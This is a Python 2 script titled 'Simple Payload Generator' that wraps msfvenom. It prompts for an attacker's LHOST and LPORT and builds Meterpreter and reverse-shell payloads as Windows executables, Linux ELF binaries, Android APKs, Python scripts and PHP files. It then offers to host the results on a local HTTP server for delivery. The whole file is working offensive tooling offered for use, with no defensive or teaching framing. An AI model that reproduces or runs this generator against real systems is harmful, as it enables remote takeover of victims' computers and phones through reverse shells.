#!/usr/bin/python
#-*- coding: utf-8 -*-
################################################################################
#                                                                              #
#                          Simple Payload Generator                            #
#                             By: 云汐zql                                      #
#                                                                              #
# Follow me :                                                                  #
# •QQ: 1838115594                                                              #
# •Wechat: Pirate_Team                                                         #
################################################################################
import os, platform, wget
from SimpleHTTPServer import test
from sys import exit
from time import sleep

red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def head():
    os.system('clear')
    print'''{0}
|====(Simple Payload Generator)====|{3}

{2}Follow me :{3}
{1}•{3} QQ : {4}1838115594{3}
{1}•{3} Wechat: {4}Pirate_Team{3}
'''.format(orange, green, bold, end, cyan)

def present():
    if os.path.isdir('output') == False:
        head()
        print('{0}Creating output directory{1}').format(green, end)
        os.makedirs('output')

def server():
    os.system('cd output/ && python -m "SimpleHTTPServer" 8888')

def main(platform, type):
    lhost = raw_input("\nEnter your LHOST\n{0}{1}root:~/LHOST#{2} ".format(green, bold, end))
    lport = raw_input("\nEnter your LPORT\n{0}{1}root:~/LPORT#{2} ".format(green, bold, end))
    output = raw_input("\nEnter the name of output file\n{0}{1}root:~/output#{2} ".format(green, bold, end))
    #Windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:
        head()
        raw_input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
        choosepayload()
    else:
        def server_start():
            head()
            http_server = raw_input('Your payload has been sucessfully generated in the output directory. Do you want to start server now ? {1}(y/n){2}\n{0}{1}root:~#{2} '.format(green, bold, end))
            if http_server == 'y' or http_server == 'Y':
                server()
            elif http_server == 'n' or http_server == 'N':
                choosepayload()
            else:
                raw_input('Please Choose a Valid option {0}(Hit Return to continue){1}'.format(bold, end))
                server_start()
        server_start()

def choosepayload():
    head()
    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}6{0}]{1} Start Server\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}root:~#{1} '.format(green, end, bold))
    if select == '1':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root:~/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root:~/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root:~/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root:~/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}root:~/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '6':
        server()
    elif select == '0':
        return "exit"
    else:
        head()
        choosepayload()

if __name__ == "__main__":
    while 1:
        try:
            head()
        except:
            null = ""
        try:
            print('{0}Proceeding...{1}').format(green, end)
        except:
            null = ""
        try:
            sleep(0.1)
            present()
        except:
            null = ""
        try:
            ret = choosepayload()
            if ret == "exit":
                break
                exit(0)
        except:
            null = ""
        
